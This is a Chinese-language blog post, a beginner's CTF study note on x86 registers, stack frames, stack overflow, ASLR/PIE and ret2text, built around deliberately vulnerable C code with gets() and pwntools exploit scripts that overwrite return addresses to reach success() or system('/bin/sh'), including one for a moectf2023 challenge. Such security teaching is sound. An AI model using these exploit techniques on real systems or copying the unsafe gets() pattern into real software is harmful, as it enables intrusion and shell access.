+<p>在x86处理器中，EIP(Instruction  Pointer)是指令寄存器，指向处理器下条等待执行的指令地址(代码段内的偏移量)，每次执行完相应汇编指令EIP值就会增加。</p>
+<h5 id="ESP-Stack-Pointer"><a href="#ESP-Stack-Pointer" class="headerlink" title="ESP(Stack  Pointer)"></a>ESP(Stack  Pointer)</h5><p>是堆栈指针寄存器，存放执行函数对应栈帧的栈顶地址(也是系统栈的顶部)，且始终指向栈顶；</p>
+<h5 id="EBP-Base-Pointer"><a href="#EBP-Base-Pointer" class="headerlink" title="EBP(Base  Pointer)"></a>EBP(Base  Pointer)</h5><p>是栈帧基址指针寄存器，存放执行函数对应栈帧的栈底地址，用于C运行库访问栈中的局部变量和参数。</p>
+<p>注意，EIP是个特殊寄存器，不能像访问通用寄存器那样访问它，即找不到可用来寻址EIP并对其进行读写的操作码(OpCode)。</p>
+<p>EIP可被jmp、call和ret等指令隐含地改变(事实上它一直都在改变)。</p>
+<p><strong>栈帧结构</strong></p>
+<ul>
+<li>函数调用经常是嵌套的，在同一时刻，堆栈中会有多个函数的信息。每个未完成运行的函数占用一个独立的连续区域，称作栈帧(Stack Frame)</li>
+<li>栈帧是堆栈的逻辑片段</li>
+<li>栈帧存放着函数参数，局部变量及恢复前一栈帧所需要的数据等。</li>
+<li>栈帧的边界由栈帧基地址指针EBP和堆栈指针ESP界定(指针存放在相应寄存器中)。</li>
+<li>EBP指向当前栈帧底部(高地址)，在当前栈帧内位置固定；ESP指向当前栈帧顶部(低地址)，当程序执行时ESP会随着数据的入栈和出栈而移动。</li>
+<li>因此函数中对大部分数据的访问都基于EBP进行。</li>
+</ul>
+<p>IDA的基础用法</p>
+<p>这里是跟着<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45943522/category_10819749.html">pwn小白入门</a>、<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/">CTFwiki</a>学习，还有师傅们的悉心教导（我这么菜，真是难为师傅们了）</p>
+<p>指令指针寄存器EIP</p>
+<h1 id="Study-Now"><a href="#Study-Now" class="headerlink" title="Study Now!"></a>Study Now!</h1><h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><h3 id="基本栈介绍"><a href="#基本栈介绍" class="headerlink" title="基本栈介绍"></a>基本栈介绍</h3><p>学过数据结构的应该清楚（</p>
+<p>简单了解一下：</p>
+<ul>
+<li>栈是一种后进先出的数据结构</li>
+<li>操作主要有压栈 (push) 与出栈 (pop)，存储数据和取出数据</li>
+<li>主要操作栈顶，但是也有栈底</li>
+</ul>
+<p><strong>类似往箱子里放东西，后放进的先拿出，但是只能在最上面拿防东西</strong></p>
+<p><strong>要注意的是</strong></p>
+<ul>
+<li>在现代计算机体系结构中，每个进程都有自己的地址空间，用于存储程序的指令、数据和其他相关信息。</li>
+<li><strong>进程地址空间</strong>通常被划分为多个区域，如代码区、数据区、堆区和栈区。</li>
+<li>其中栈区，用于保存函数调用信息和局部变量</li>
+<li>当函数被调用时，函数的参数和局部变量等数据会被推入栈中，形成一个称为栈帧（stack frame）的数据结构。</li>
+<li>栈帧包含了函数的返回地址、参数、局部变量和其他与函数执行相关的数据。</li>
+<li>栈帧通过不断向栈底方向增加（减小地址）来动态增长。<strong>栈顶高地址，栈底低地址</strong>,从而方便函数调用</li>
+<li><strong>总结便是：程序的栈是从进程地址空间的高地址向低地址增长的</strong></li>
+</ul>
+<h3 id="基础栈溢出"><a href="#基础栈溢出" class="headerlink" title="基础栈溢出"></a>基础栈溢出</h3><p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/">come form</a></p>
+<p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是</p>
+<ul>
+<li>程序必须向栈上写入数据。</li>
+<li>写入的数据大小没有被良好地控制。</li>
+</ul>
+<p>这里主要介绍栈溢出</p>
+<p>最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址，<strong>当然需要确保这个地址所在的段具有可执行权限</strong></p>
+<h4 id="来个测试程序"><a href="#来个测试程序" class="headerlink" title="来个测试程序"></a>来个测试程序</h4><h5 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h5><pre><code class="c">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+void success() &#123; puts(&quot;You Hava already controlled it.&quot;); &#125;
+void vulnerable() &#123;
+  char s[12];
+  gets(s);
+  puts(s);
+  return;
+&#125;
+int main(int argc, char **argv) &#123;
+  vulnerable();
+  return 0;
+&#125;
+</code></pre>
+<p>这个程序的主要目的读取一个字符串，并将其输出。<strong>我们希望可以控制程序执行 success 函数。</strong></p>
+<p>gcc编译，<strong>编译前请先关闭ASLR</strong>(下面有)</p>
+<pre><code class="sh">gcc -m32 -fno-stack-protector -no-pie 1.c -o pwntest
+</code></pre>
+<blockquote>
+<p>jue@ubuntu:~&#x2F;桌面&#x2F;newpwn&#x2F;C$ gcc -m32 -fno-stack-protector -no-pie 1.c -o pwntest<br>1.c: In function ‘vulnerable’:<br>1.c:6:3: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration]<br>   gets(s);<br>   ^~~~<br>   fgets<br>&#x2F;tmp&#x2F;ccBLJIgI.o：在函数‘vulnerable’中：<br>1.c:(.text+0x45): 警告： the &#96;gets’ function is dangerous and should not be used.</p>
+</blockquote>
+<p>可以看出 gets 本身是一个危险函数。它从不检查输入字符串的长度，而是以回车来判断输入是否结束，所以很容易可以导致栈溢出，</p>
+<p>gcc 编译指令中，<code>-m32</code> 指的是生成 32 位程序； <code>-fno-stack-protector</code> 指的是不开启堆栈溢出保护，即不生成 canary</p>
+<p>此外，为了更加方便地介绍栈溢出的基本利用方式，这里还需要关闭 PIE（Position Independent Executable），避免加载基址被打乱。</p>
+<p>不同 gcc 版本对于 PIE 的默认配置不同，我们可以使用命令<code>gcc -v</code>查看 gcc 默认的开关情况。</p>
+<p>如果含有<code>--enable-default-pie</code>参数则代表 PIE 默认已开启，需要在编译指令中添加参数<code>-no-pie</code>。</p>
+<p>我这里开启了PIE保护，所以指令添加了对应参数</p>
+<p>checksec 检查编译出的文件</p>
+<pre><code>   Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</code></pre>
+<p>提到编译时的 PIE 保护，Linux 平台下还有地址空间分布随机化（ASLR）的机制。</p>
+<p>简单来说即使可执行文件开启了 PIE  保护，还需要系统开启 ASLR 才会真正打乱基址，否则程序运行时依旧会在加载一个固定的基址上（不过和 No PIE  时基址不同）。</p>
+<p>我们可以通过修改 <code>/proc/sys/kernel/randomize_va_space</code> 来控制 ASLR 启动与否，具体的选项有</p>
+<ul>
+<li>0，关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同。</li>
+<li>1，普通的 ASLR。栈基地址、mmap 基地址、.so 加载基地址都将被随机化，但是堆基地址没有随机化。</li>
+<li>2，增强的 ASLR，在 1 的基础上，增加了堆基地址随机化。</li>
+</ul>
+<p>看了一眼，我的系统默认的是2，而且只读权限</p>
+<p>这里要先给randomize_va_space一个写的权限，发现赋权失败</p>
+<p>百度发现我们可以使用<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>关闭 Linux 系统的 ASLR，类似的，也可以配置相应的参数。</p>
+<p>这里要先进root,至于为什么<code>sudo echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>失败，我也不清楚</p>
+<p>为了降低后续漏洞利用复杂度，我们这里关闭 ASLR，在编译时关闭 PIE。</p>
+<h5 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h5><p>IDA 来反编译一下二进制程序并查看 vulnerable 函数 。可以看到</p>
+<pre><code class="c">int vulnerable()
+&#123;
+  char s[16]; // [esp+4h] [ebp-14h] BYREF
+
+  gets(s);
+  return puts(s);
+&#125;
+</code></pre>
+<p>看到[ebp-14h]</p>
+<p>说明该字符串距离 ebp 的长度为 0x14，那么相应的栈结构为</p>
+<p><strong>“retaddr” 是指函数调用过程中保存的返回地址（return address）</strong></p>
+<pre><code>                                           +-----------------+
+                                           |     retaddr     |
+                                           +-----------------+
+                                           |     saved ebp   |
+                                    ebp---&gt;+-----------------+
+                                           |                 |
+                                           |                 |
+                                           |                 |
+                                           |                 |
+                                           |                 |
+                                           |                 |
+                              s,ebp-0x14--&gt;+-----------------+
+</code></pre>
+<p>并且，我们可以通过 IDA 获得 success 的地址 0x08048456</p>
+<pre><code class="c">.text:08048456 success         proc near
+.text:08048456
+.text:08048456 var_4           = dword ptr -4
+.text:08048456
+.text:08048456 ; __unwind &#123;
+.text:08048456                 push    ebp
+.text:08048457                 mov     ebp, esp
+.text:08048459                 push    ebx
+.text:0804845A                 sub     esp, 4
+.text:0804845D                 call    __x86_get_pc_thunk_ax
+.text:08048462                 add     eax, (offset _GLOBAL_OFFSET_TABLE_ - $)
+.text:08048467                 sub     esp, 0Ch
+.text:0804846A                 lea     edx, (aYouHavaAlready - 804A000h)[eax] ; &quot;You Hava already controlled it.&quot;
+.text:08048470                 push    edx             ; s
+.text:08048471                 mov     ebx, eax
+.text:08048473                 call    _puts
+.text:08048478                 add     esp, 10h
+.text:0804847B                 nop
+.text:0804847C                 mov     ebx, [ebp+var_4]
+.text:0804847F                 leave
+.text:08048480                 retn
+.text:08048480 ; &#125; // starts at 8048456
+.text:08048480 success         endp
+</code></pre>
+<p>我们的目的便是覆盖retaddr，让读取字符串结束后函数返回到我们要执行的函数</p>
+<p>那么如果我们读取的字符串为</p>
+<pre><code>0x14*&#39;a&#39;+&#39;bbbb&#39;+success_addr
+</code></pre>
+<p>那么，由于 gets 会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将 saved ebp 覆盖为 bbbb，将 retaddr 覆盖为 success_addr，即，此时的栈结构为</p>
+<pre><code>                                           +-----------------+
+                                           |    0x08048456   |
+                                           +-----------------+
+                                           |       bbbb      |
+                                    ebp---&gt;+-----------------+
+                                           |                 |
+                                           |                 |
+                                           |                 |
+                                           |                 |
+                                           |                 |
+                                           |                 |
+                              s,ebp-0x14--&gt;+-----------------+
+</code></pre>
+<p>但是需要注意的是，由于在计算机内存中，每个值都是按照字节存储的。一般情况下都是采用小端存储，即 0x08048456 在内存中的形式是</p>
+<pre><code>V\x84\x04\x08
+</code></pre>
+<p>但是，我们又不能直接在终端将这些字符给输入进去，在终端输入的时候 \，x 等也算一个单独的字符。</p>
+<p>所以我们需要想办法将 \x84  作为一个字符输入进去。</p>
+<p>那么此时我们就需要使用一波 pwntools 了，这里利用  pwntools 的代码如下：</p>
+<pre><code class="python">from pwn import *
+## 构造与程序交互的对象
+P = process(&#39;pwntest&#39;)
+success_addr = 0x08048456
+## 构造payload
+payload =b&#39;a&#39; * 0x14 + b&#39;bbbb&#39; + p32(success_addr)
+## 向程序发送字符串
+P.sendline(payload)
+## 将代码交互转换为手工交互
+P.interactive()
+</code></pre>
+<p>可以看到成功溢出并且执行了success函数</p>
+<p><strong>You Hava already controlled it.</strong></p>
+<pre><code class="sh">[!] Could not find executable &#39;pwntest&#39; in $PATH, using &#39;./pwntest&#39; instead
+[+] Starting local process &#39;./pwntest&#39;: pid 3339
+[*] Switching to interactive mode
+aaaaaaaaaaaaaaaaaaaabbbbV\x84\x04
+You Hava already controlled it.
+[*] Got EOF while reading in interactive
+$
+</code></pre>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>上面的示例展示了栈溢出中比较重要的几个步骤。</p>
+<h5 id="1、寻找危险函数"><a href="#1、寻找危险函数" class="headerlink" title="1、寻找危险函数"></a>1、寻找危险函数</h5><p>通过寻找危险函数，我们快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。常见的危险函数如下</p>
+<ul>
+<li>输入<ul>
+<li>gets，直接读取一行，忽略’\x00’</li>
+<li>scanf</li>
+<li>vscanf</li>
+</ul>
+</li>
+<li>输出</li>
+<li>sprintf</li>
+<li>字符串</li>
+<li>strcpy，字符串复制，遇到’\x00’停止</li>
+<li>strcat，字符串拼接，遇到’\x00’停止</li>
+<li>bcopy</li>
+</ul>
+<h5 id="2、确定填充长度"><a href="#2、确定填充长度" class="headerlink" title="2、确定填充长度"></a>2、确定填充长度</h5><p>这一部分主要是计算<strong>我们所要操作的地址与我们所要覆盖的地址的距离</strong>。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式</p>
+<ul>
+<li>相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得</li>
+<li>相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。</li>
+<li>直接地址索引，就相当于直接给定了地址。</li>
+</ul>
+<p>一般来说，我们会有如下的覆盖需求</p>
+<ul>
+<li><strong>覆盖函数返回地址</strong>，这时候就是直接看 EBP 即可。</li>
+<li><strong>覆盖栈上某个变量的内容</strong>，这时候就需要更加精细的计算了。</li>
+<li><strong>覆盖 bss 段某个变量的内容</strong>。</li>
+<li>根据现实执行情况，覆盖特定的变量或地址的内容。</li>
+</ul>
+<p>之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来<strong>直接或者间接地控制程序执行流程</strong>。</p>
+<h3 id="基本ROP"><a href="#基本ROP" class="headerlink" title="基本ROP"></a>基本ROP</h3><p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。</p>
+<p>攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)</p>
+<p>其主要思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong></p>
+<p>所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p>
+<p>之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。</p>
+<p>ROP 攻击一般得满足如下条件</p>
+<ul>
+<li>程序存在溢出，并且可以控制返回地址。</li>
+<li>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</li>
+</ul>
+<p>如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。</p>
+<h4 id="Ret2text"><a href="#Ret2text" class="headerlink" title="Ret2text"></a>Ret2text</h4><p>ret2text 即控制程序执行程序本身已有的的代码 (.text)</p>
+<p>其实，这种攻击方法是一种笼统的描述。</p>
+<p>我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p>
+<p>这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p>
+<h5 id="来个栗子"><a href="#来个栗子" class="headerlink" title="来个栗子"></a>来个栗子</h5><p>文件略</p>
+<p>先<code>checksec</code>查看一下程序的保护机制</p>
+<pre><code class="sh">  Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</code></pre>
+<p>可以看出程序是 32 位程序，其仅仅开启了栈不可执行保护。然后，我们使用 IDA 来查看源代码。</p>
+<pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp)
+&#123;
+  char s[100]; // [esp+1Ch] [ebp-64h] BYREF
+
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(_bss_start, 0, 1, 0);
+  puts(&quot;There is something amazing here, do you know anything?&quot;);
+  gets(s);
+  printf(&quot;Maybe I will tell you next time !&quot;);
+  return 0;
+&#125;
+</code></pre>
+<p>看到使用了get函数，存在栈溢出</p>
+<p>shift+f12发现了&#x2F;bin&#x2F;sh</p>
+<p>查看发现，地址为 08048763</p>
+<p>即返回地址覆盖为 0x08048763</p>
+<p>下面就是我们如何构造 payload 了，首先需要确定的是<strong>我们能够控制的内存的起始地址距离 main 函数的返回地址的字节数</strong>。 </p>
+<p>去main函数双击get(s)的s</p>
+<pre><code class="sh">-00000066                 db ? ; undefined
+-00000065                 db ? ; undefined
+-00000064 s               db 100 dup(?)
++00000000  s              db 4 dup(?)
++00000004  r              db 4 dup(?)
++00000008 argc            dd ?
++0000000C argv            dd ?                    ; offset
++00000010 envp            dd ?                    ; offset
++00000014
++00000014 ; end of stack variables
+</code></pre>
+<p>可以看到s 是0x64大小，直接填充0x64+4的垃圾字符就可以溢出到存储返回地址的寄存器里</p>
+<h6 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h6><pre><code class="python">from pwn import *
+
+
+p = process(&#39;ret2text&#39;)
+
+payload=b&#39;a&#39;*(0x64+4)+p32(0x08048763)
+
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<h1 id="Practise"><a href="#Practise" class="headerlink" title="Practise!"></a>Practise!</h1><h2 id="Ret2text-1"><a href="#Ret2text-1" class="headerlink" title="Ret2text"></a>Ret2text</h2><p>最基础的ROP</p>
+<blockquote>
+<p>题目 come from moectf2023</p>
+</blockquote>
+<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><p><img src="/img/image-20230914144505349.png"></p>
+<p>先checksec一下开启的保护，这里程序是</p>
+<blockquote>
+<p>32位小端序程序<br>开启了堆栈不可执行保护（NX），即不会把堆栈上的数据当成指令来执行。<br>没有canary保护，可以利用栈溢出来修改eip。<br>PIE地址随机化没有开启。</p>
+</blockquote>
+<h3 id="ida32"><a href="#ida32" class="headerlink" title="ida32"></a>ida32</h3><p>然后ida查看有没有后门函数</p>
+<p>shift+F12</p>
+<p><img src="/img/image-20230914144825345.png"></p>
+<p>发现&#x2F;bin&#x2F;sh 后门函数</p>
+<p>但是&#x2F;bin&#x2F;sh位于data段，也就是字符，无法利用</p>
+<p>但是有system函数，可以把system溢出到下一个要执行的命令，然后让&#x2F;bin&#x2F;sh成为他的data，从而拿到shell</p>
+<p><strong>这里我们需要system函数的地址以及&#x2F;bin&#x2F;sh地址</strong></p>
+<p>进入拿到&#x2F;bin&#x2F;sh的地址 <code>0804C02C</code></p>
+<p><strong>如何溢出</strong></p>
+<p>查看main函数发现put函数</p>
+<p>查看</p>
+<p><img src="/img/image-20230914150229035.png"></p>
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>首先通过栈溢出填充垃圾数据，覆盖到eip之前，再填入后门函数地址，以及让data字段的&#x2F;bin&#x2F;sh成为他的data,即可获得shell。</p>
+<p><strong>那么如何确定栈溢出所需要的垃圾数据长度</strong>？</p>
+<p>可以通过ida直接看，这里buf可以填充58个任意字符，再填充4个任意字符，接下来的字符就会溢出到eip中</p>
+<p>从而控制下一个要执行的函数</p>
+<p><strong>如何实现?</strong></p>
+<p>通过pwntools工具，以及debug调试，实现对二进制文件的操作</p>
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>佬写的exp</p>
+<pre><code class="python">from pwn import *
+# context(log_level=&#39;debug&#39;)
+elf = ELF(&#39;pwn&#39;)
+p = process(&#39;pwn&#39;)	
+# p = remote(&#39;192.168.31.174&#39;,58458)
+
+system_plt = elf.plt[&#39;system&#39;]
+payload= b&#39;a&#39;*(0x58+4)+p32(system_plt)+p32(0)+p32(0x804C02C)
+p.sendline(b&#39;1111&#39;)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以邮件至 cgjue871@163.com </span>
+    </div>
+</article>
+
+
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">
+    ©2023-2023 CCG
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+
+    /* 背景图样式 */
+    
+    #post {
+        background: url(/img/default2.png);
+    }
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.5;
+        background: url("/img/hexo.png");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
